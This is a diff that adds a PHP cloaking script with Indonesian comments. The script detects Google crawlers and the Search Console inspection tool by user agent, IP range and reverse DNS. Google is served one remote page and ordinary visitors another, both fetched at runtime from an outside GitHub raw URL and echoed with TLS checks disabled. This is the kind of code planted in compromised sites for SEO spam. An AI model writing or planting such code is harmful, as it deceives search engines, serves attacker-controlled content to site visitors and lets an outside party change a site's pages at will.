@@ -1,0 +1,184 @@
+<?php
+/**
+ * ============================================================
+ *  GOOGLE DETECTOR + CONTENT SWITCHER
+ *  - Deteksi semua varian bot Google (termasuk Google-InspectionTool)
+ *  - Fallback ke range IP Google (tanpa DNS lookup, cepat)
+ *  - Bypass cache supaya GSC selalu dapat versi terbaru
+ *  - Debug log untuk melacak UA & IP yang masuk
+ * ============================================================
+ */
+
+// ------------------------------------------------------------
+// 0. KONFIGURASI
+// ------------------------------------------------------------
+define('DEBUG_LOG', '/tmp/gsc_debug.log');   // ganti path kalau perlu (harus writable)
+define('DEBUG_ON',  true);                    // set false setelah selesai debugging
+
+define('URL_GOOGLE', 'https://raw.githubusercontent.com/bedorsunggal-png/dorrr/refs/heads/main/tam');
+define('URL_NORMAL', 'https://raw.githubusercontent.com/bedorsunggal-png/dorrr/refs/heads/main/tih');
+
+// ------------------------------------------------------------
+// 1. HEADER BYPASS CACHE
+//    Supaya GSC / CDN tidak menyajikan versi lama
+// ------------------------------------------------------------
+header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
+header('Pragma: no-cache');
+header('Expires: 0');
+header('Vary: User-Agent');
+
+// ------------------------------------------------------------
+// 2. FUNGSI AMBIL KONTEN
+// ------------------------------------------------------------
+function get_raw($url) {
+    $ch = curl_init($url);
+    curl_setopt_array($ch, [
+        CURLOPT_RETURNTRANSFER => true,
+        CURLOPT_FOLLOWLOCATION => true,
+        CURLOPT_SSL_VERIFYPEER => false,
+        CURLOPT_SSL_VERIFYHOST => false,
+        CURLOPT_TIMEOUT        => 15,
+        CURLOPT_CONNECTTIMEOUT => 10,
+        CURLOPT_USERAGENT      => 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
+    ]);
+    $out  = curl_exec($ch);
+    $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+    $err  = curl_error($ch);
+    curl_close($ch);
+
+    if ($out === false || $code >= 400) {
+        if (DEBUG_ON) {
+            @file_put_contents(DEBUG_LOG,
+                date('c') . " | GET_RAW_FAIL | url=$url | code=$code | err=$err\n",
+                FILE_APPEND);
+        }
+        return '';
+    }
+    return $out;
+}
+
+// ------------------------------------------------------------
+// 3. DETEKSI USER-AGENT GOOGLE
+// ------------------------------------------------------------
+$ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
+$ip = $_SERVER['REMOTE_ADDR']     ?? '';
+
+$uaList = [
+    'Googlebot',
+    'Google-InspectionTool',   // <-- kunci utama untuk Inspeksi URL GSC
+    'Googlebot-Image',
+    'Googlebot-News',
+    'Googlebot-Video',
+    'Googlebot-Smartphone',
+    'Googlebot-Desktop',
+    'AdsBot-Google',
+    'AdsBot-Google-Mobile',
+    'APIs-Google',
+    'Mediapartners-Google',
+    'Google Favicon',
+    'Google-Site-Verification',
+    'GoogleOther',
+    'Google-Read-Aloud',
+    'Storebot-Google',
+    'FeedFetcher-Google',
+    'Google-PhysicalWeb',
+    'Google-Notetaker',
+    'Google-Apps-Script',
+    'Google-Cloud-Scheduler',
+    'Google-PageRenderer',
+    'Lighthouse',
+];
+
+$isGoogle = false;
+$matchedBy = '';
+
+foreach ($uaList as $needle) {
+    if ($ua !== '' && stripos($ua, $needle) !== false) {
+        $isGoogle  = true;
+        $matchedBy = "UA:$needle";
+        break;
+    }
+}
+
+// ------------------------------------------------------------
+// 4. FALLBACK: CEK RANGE IP GOOGLE (cepat, tanpa DNS)
+// ------------------------------------------------------------
+if (!$isGoogle && $ip !== '') {
+    $long = ip2long($ip);
+    if ($long !== false) {
+        // Range IP resmi Google (sebagian besar yang dipakai crawler & inspection tool)
+        $ranges = [
+            ['66.249.64.0',   '66.249.95.255'],   // Googlebot
+            ['64.233.160.0',  '64.233.191.255'],  // Google
+            ['66.102.0.0',    '66.102.15.255'],   // Google
+            ['72.14.192.0',   '72.14.255.255'],   // Google
+            ['74.125.0.0',    '74.125.255.255'],  // Google
+            ['209.85.128.0',  '209.85.255.255'],  // Google
+            ['216.239.32.0',  '216.239.63.255'],  // Google
+            ['216.58.192.0',  '216.58.223.255'],  // Google
+            ['216.239.36.0',  '216.239.63.255'],  // Google
+            ['142.250.0.0',   '142.251.255.255'], // Google
+            ['172.217.0.0',   '172.217.255.255'], // Google
+            ['172.253.0.0',   '172.253.255.255'], // Google
+            ['173.194.0.0',   '173.194.255.255'], // Google
+            ['108.177.0.0',   '108.177.127.255'], // Google
+            ['35.190.0.0',    '35.191.255.255'],  // Google Cloud (InspectionTool kadang di sini)
+            ['35.192.0.0',    '35.255.255.255'],  // Google Cloud
+            ['34.64.0.0',     '34.127.255.255'],  // Google Cloud
+        ];
+        foreach ($ranges as [$start, $end]) {
+            if ($long >= ip2long($start) && $long <= ip2long($end)) {
+                $isGoogle  = true;
+                $matchedBy = "IP_RANGE:$start-$end";
+                break;
+            }
+        }
+    }
+}
+
+// ------------------------------------------------------------
+// 5. FALLBACK: REVERSE DNS (opsional, hanya jika kedua cara di atas gagal)
+//    Dibungkus timeout supaya tidak lambat
+// ------------------------------------------------------------
+if (!$isGoogle && $ip !== '') {
+    $host = @gethostbyaddr($ip);
+    if ($host && preg_match('/\.(googlebot|google)\.com$/i', $host)) {
+        $isGoogle  = true;
+        $matchedBy = "RDNS:$host";
+    }
+}
+
+// ------------------------------------------------------------
+// 6. DEBUG LOG
+// ------------------------------------------------------------
+if (DEBUG_ON) {
+    @file_put_contents(DEBUG_LOG, sprintf(
+        "%s | IP=%s | UA=%s | GOOGLE=%s | MATCH=%s\n",
+        date('c'),
+        $ip,
+        $ua === '' ? 'NONE' : $ua,
+        $isGoogle ? 'YES' : 'NO',
+        $matchedBy === '' ? '-' : $matchedBy
+    ), FILE_APPEND);
+}
+
+// ------------------------------------------------------------
+// 7. AMBIL KONTEN SESUAI HASIL DETEKSI + FALLBACK
+// ------------------------------------------------------------
+$url  = $isGoogle ? URL_GOOGLE : URL_NORMAL;
+$body = get_raw($url);
+
+if ($body === '') {
+    // Fallback: kalau gagal ambil, coba URL satunya
+    $body = get_raw($isGoogle ? URL_NORMAL : URL_GOOGLE);
+}
+
+// Fallback terakhir: jangan tampilkan halaman kosong
+if ($body === '') {
+    $body = '<!-- content unavailable -->';
+}
+
+// ------------------------------------------------------------
+// 8. OUTPUT
+// ------------------------------------------------------------
+echo $body;
